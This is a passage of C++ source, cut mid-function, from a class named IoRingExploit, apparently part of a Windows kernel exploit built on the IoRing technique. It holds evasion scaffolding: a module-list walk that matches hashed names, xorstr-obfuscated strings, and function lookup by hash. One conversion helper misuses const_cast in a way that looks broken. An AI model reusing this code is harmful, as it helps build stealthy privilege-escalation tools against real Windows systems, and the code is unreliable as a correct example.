	if (!ldrEntry)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Ldr Entry"));
		return nullptr;
	}

	do
	{
		if (ldrEntry->BaseDllName.Buffer == nullptr) break;
		else
		{
			entry = CONTAINING_RECORD(ldrEntry, LDR_DATA_TABLE_ENTRY64, InMemoryOrderLinks);
		}


		if (Rsh.String_cmp(hashedModuleName, entry->BaseDllName.Buffer))
		{
			return (PBYTE)entry->DllBase;
		}


		ldrEntry = *(PLDR_DATA_TABLE_ENTRY64*)(ldrEntry);

	} while (ldrEntry);


	return nullptr;
}



template<typename input>
bool IoRingExploit::StringConversionUtil(__in void* destination, __in  input source)
{
	if constexpr (std::is_same_v<input, std::string>)
	{
		std::wstring wConversion(source.begin(), source.end());

		std::memcpy(destination, wConversion.c_str(), (wConversion.size() * sizeof(wchar_t) + 2));

		if (std::wcscmp(const_cast<wchar_t*>(destination), wConversion.c_str()) == 0) return true;
	}

	if constexpr (std::is_same_v<input, std::wstring>)
	{
		std::string aConversion(source.begin(), source.end());

		std::memcpy(destination, aConversion.c_str(), (aConversion.size() * sizeof(char) + 1));

		if (std::strcmp(const_cast<char*>(destination), aConversion.c_str()) == 0) return true;
	}

	return false;
}


void* IoRingExploit::Fetch_Function(std::uint32_t hashedName)
{

	for (auto& it : this->functionPointers)
	{
		if (Rsh.Hash_Compare(hashedName, it.hashedName)) return it.function_Ptr;
	}

	return nullptr;
}